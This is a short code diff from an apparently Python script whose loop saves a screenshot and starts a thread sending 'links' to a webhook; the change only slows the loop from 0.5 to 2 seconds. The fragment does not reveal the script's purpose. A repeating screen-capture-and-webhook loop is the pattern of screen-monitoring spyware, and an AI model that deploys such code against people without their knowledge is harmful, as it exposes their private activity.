@@ -23,4 +23,5 @@ while True:
         screenshot.save("screen.png")
         t1 = threading.Thread(target=sendwebhook, args=(links,))
         t1.start()
-        time.sleep(0.5)
+        time.sleep(2)
+       
